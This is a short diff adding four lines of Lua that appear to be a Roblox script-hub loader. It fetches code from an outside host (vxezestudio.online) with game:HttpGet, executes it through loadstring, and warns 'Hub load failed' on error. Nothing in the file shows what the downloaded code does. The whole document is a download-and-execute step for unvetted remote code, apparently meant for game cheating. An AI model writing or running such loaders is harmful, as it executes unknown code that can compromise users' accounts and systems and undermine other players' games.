@@ -1,0 +1,4 @@
+local ok, err = pcall(function()
+    loadstring(game:HttpGet("https://vxezestudio.online/api/scripts/script_IfLaVGmXfx2rV/stream/init"))()
+end)
+if not ok then warn("Hub load failed: " .. tostring(err)) end
